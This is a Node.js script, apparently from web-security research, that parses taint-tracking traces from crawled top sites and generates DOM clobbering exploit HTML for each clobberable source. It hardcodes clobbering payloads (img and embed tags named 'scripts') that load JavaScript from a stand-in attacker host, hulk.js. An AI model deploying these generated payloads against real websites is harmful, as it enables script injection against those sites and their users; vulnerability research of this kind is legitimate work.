/**
 * @description
 * -------------------
 * This script is used to generate the exploit html according to the clobbering sources only.
 * 
 * Given a output folder from the crawler, it generate the exploit html for each 1/ clobbering source, 3/ clobbering source with taint flow.
 * Then, output the html exploit to its folder with file named: exploit.txt.
 */

import { log } from 'console';
import { DOMClobberingPayloadGenerator } from './exploit-generator-thething-full.js';
import { DOMClobberingPayloadGeneratorShort } from './exploit-generator-thething-short.js';
import fs from 'fs';
import path from 'path';

var fromCurrentScripts = [];

/**
 * @description
 * -------------------
 * Given a taint trace, it outputs the effective clobberable source code.
 * For example, given the following taint trace:
 * 
 *   {
 *     "operation": "getField",
 *     "base": "[object Object]",
 *     "arguments": [
 *         "default"
 *     ],
 *     "location": 25217,
 *     "indicator": "base"
 *   },
 *   {
 *     "operation": "getField",
 *     "base": "[object Object]",
 *     "arguments": [
 *         "LanguageSwitcherPlaceholder"
 *     ],
 *     "location": 61545,
 *     "indicator": "base"
 *   },
 *   {
 *     "operation": "getField",
 *     "base": "[object Object]",
 *     "arguments": [
 *         "regionRule"
 *     ],
 *     "location": 534977,
 *     "indicator": "base"
 *   },
 *   {
 *     "operation": "getField",
 *     "base": "[object Window]",
 *     "arguments": [
 *         "otStubData"
 *     ],
 *     "location": 534577
 *   }
 *   * it will output the following code: window.otStubData.regionRule.LanguageSwitcherPlaceholder.default
 */
function parseTaintTrace(taintFlow) {
  // Firstly, we flatten the taint flow
  // When taint merge happens, we will have a operation element that has a taintPropOperations field, which is an array of taint flows
  // We append all these flow segments to a new array for each segment
  let taintFlowSegments = [];

  // Helper function to flatten the taint flow
  function flattenTaintFlow(flow, segment) {
    for (let i = 0; i < flow.length; i++) {
      segment.push(flow[i]);
      if (flow[i].taintPropOperations) {
        for (let j = 0; j < flow[i].taintPropOperations.length; j++) {
          let newSegment = [];
          flattenTaintFlow(flow[i].taintPropOperations[j], newSegment);
          taintFlowSegments.push(newSegment);
        }
      }
    }
  }

  // Flatten the provided taint flow
  let initialSegment = [];
  flattenTaintFlow(taintFlow, initialSegment);
  taintFlowSegments.push(initialSegment);

  let results = [];
  taintFlowSegments.forEach(segment => {
    let codeChain = '';
    let baseObject = '';

    for (let i = segment.length - 1; i >= 0; i--) {
      const operation = segment[i];
      
      if (operation.operation === 'getField') {
        if (!baseObject && (operation.base === '[object Window]' || operation.base === '[object HTMLDocument]')) {
          baseObject = operation.base === '[object Window]' ? 'window' : 'document';
        }
        codeChain = codeChain ? `${codeChain}.${operation.arguments[0]}` : operation.arguments[0];
      }
    }

    if (baseObject && codeChain) {
      results.push(`${baseObject}.${codeChain}`);
    }
  });

  return results;
}


/**
 * @description
 * -------------------
 * Read the taint flows from the given file path.
 * 
 * @param {*} filepath
 */
function readTaintFlows(filepath){
  let taintFlows = [];
  try {
    const data = fs.readFileSync(filepath, 'utf8');
    const rawFlows = JSON.parse(data);

    // Extract the taint operations from the raw data
    for (let i = 0; i < rawFlows.length; i++) {
      const taintFlow = rawFlows[i].taintedValue;
      if (taintFlow.taintInfo){
        taintFlows.push(taintFlow.taintInfo.taintPropOperations);
      }
    }

    return taintFlows;
  } catch (err) {
    return taintFlows;
  }
}


/**
 * @description
 * -------------------
 * 
 * @param {String} crawlFolderPath
 */
function GenerateAllPossibleClobberableSources(crawlFolderPath){
  let clobberableSourcePattern = new Set();

  // 1/ Read the taint flows from the given file path
  const taintFlows = readTaintFlows(crawlFolderPath + '/taintflows.json');
  for (let i = 0; i < taintFlows.length; i++){
    const clobberableSource = parseTaintTrace(taintFlows[i]);
    clobberableSource.forEach(source => clobberableSourcePattern.add(source));
  }

  // 2/ Generate from the clobberable sources
  let clobberableSourcePool = {};
  try {
    clobberableSourcePool = JSON.parse(fs.readFileSync(crawlFolderPath + '/clobberableSourcePool.json', 'utf8'));
  } catch (err) {};

  // Add document-based sources if they exist
  if (clobberableSourcePool["SOURCE-FROM-DOCUMENT"]) {
    clobberableSourcePool["SOURCE-FROM-DOCUMENT"].forEach(source => {
      clobberableSourcePattern.add("document." + source);
    });
  }

  // Add window-based sources if they exist
  if (clobberableSourcePool["SOURCE-FROM-WINDOW"]) {
    clobberableSourcePool["SOURCE-FROM-WINDOW"].forEach(source => {
      clobberableSourcePattern.add("window." + source);
    });
  }

  // Convert the set back to an array and return
  return Array.from(clobberableSourcePattern);
}


/**
 * @description
 * -------------------
 * Output the exploit HTML in the specified format.
 * 
 * @param {String} crawlFolderPath - The path to the folder where the exploits will be saved.
 * @param {Array} exploits - The array of exploit HTML strings.
 */
function outputExploit(crawlFolderPath, exploits, postfix = '') {
  // Read the URL from the file
  const urlPath = `${crawlFolderPath}/url.out`;
  let url = '';

  exploits.push('<img name="scripts" src="https://atttack.hulk.com/hulk.js"><img name="scripts" src="https://atttack.hulk.com/hulk.js"><img name="scripts" src="https://atttack.hulk.com/hulk.js"><img name="scripts" src="https://atttack.hulk.com/hulk.js"><img name="scripts" src="https://atttack.hulk.com/hulk.js">')
  exploits.push('<embed name="scripts" src="https://atttack.hulk.com">hulk.js</embed><embed name="scripts" src="https://atttack.hulk.com">hulk.js</embed>')

  try {
    url = fs.readFileSync(urlPath, 'utf8').trim(); // Read and trim any extra whitespace
  } catch (err) {
    console.error(`Failed to read URL from ${urlPath}:`, err);
    return;
  }

  const formattedExploits = `===============URL===============\n${url}\n===============EXP===============\n${exploits.join('\n')}\n`;
  fs.writeFileSync(crawlFolderPath + `/exploit-${postfix}.txt`, formattedExploits);
}

/**
 * @description
 * -------------------
 * Generate the exploit HTML for the given clobberable source.
 * 
 * @param {String} crawlFolderPath - The path to the folder where the taint flows and source pool are located.
 */
function generateExploitHtml(crawlFolderPath) {
  let fullResults = [];
  let shortResults = [];
  const clobberableSource = GenerateAllPossibleClobberableSources(crawlFolderPath);
  const generator1 = new DOMClobberingPayloadGenerator();
  const generator2 = new DOMClobberingPayloadGeneratorShort();

  for (let i = 0; i < clobberableSource.length; i++) {
    const exploitHtml1 = generator1.create_dom_clobbering_html_payload({
      clobbering_target: clobberableSource[i],
      clobbering_value: 'https://attack.hulk.hulk/hulk.js'
    });
    const exploitHtml2 = generator2.create_dom_clobbering_html_payload({
      id: i,
      code: clobberableSource[i],
    });
    if (exploitHtml1) {
      fullResults = fullResults.concat(exploitHtml1);
    }
    if (exploitHtml2.payload) {
      shortResults.push(exploitHtml2.payload);
    }
  }
  outputExploit(crawlFolderPath, fullResults, 'full');
  outputExploit(crawlFolderPath, shortResults, 'short');

  return fullResults.length;
}


/**
 * @description
 * -------------------
 * Go through all the crawl folders and generate the exploit HTML for each.
 * 
 * crawlFolderRootPath
 * -- Domain1
 *    -- Page1  
 *      -- crawler
 *        -- taintflows.json
 *        -- clobberableSourcePool.json
 *    -- Page2
 * 
 * @param {String} crawlFolderRootPath
 */
function main(crawlFolderRootPath) {
  let totalExploits = 0;

  // Recursively traverse the crawlFolderRootPath to find all crawler directories
  function traverseDirectory(directoryPath) {
    const filesAndDirs = fs.readdirSync(directoryPath);

    filesAndDirs.forEach(item => {
      const fullPath = path.join(directoryPath, item);
      if (fs.statSync(fullPath).isDirectory()) {
        if (fs.existsSync(path.join(fullPath, 'crawler'))) {
          const crawlerPath = path.join(fullPath, 'crawler');
          totalExploits += generateExploitHtml(crawlerPath);
          console.log(`[+] Processing directory: ${crawlerPath}`);
        }else{
          traverseDirectory(fullPath);
        }
      }
    });
  }

  traverseDirectory(crawlFolderRootPath);

  console.log(`[+] Total number of generated exploits: ${totalExploits}`);
}


main('/home/jackfromeast/Desktop/TheHulk/gadget-detection/defined-tasks/run-taint-tracking-trenco/output/TAINT-TRACKING-Trenco-09-02-12-54-Top500');